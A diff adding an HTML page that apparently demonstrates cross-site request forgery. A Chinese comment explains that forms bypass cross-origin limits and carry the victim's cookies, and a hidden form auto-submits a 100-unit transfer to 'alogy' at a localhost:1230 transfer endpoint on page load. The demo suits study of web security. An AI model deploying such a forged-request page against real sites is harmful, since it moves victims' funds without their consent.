@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+</head>
+<body>
+    
+    第三方网站，拿不到cookies，当往1230端口去提交数据的时候，自动带上cookies。
+    form表单没有跨域问题
+    <form name="badForm" action="http://localhost:1230/api/transfer" method="POST">
+        <input type="text" value="alogy" name="target">
+        <input type="text" value="100" name="money">
+    </form>
+
+    <script>
+        document.badForm.submit()
+    </script>
+
+</body>
+</html>
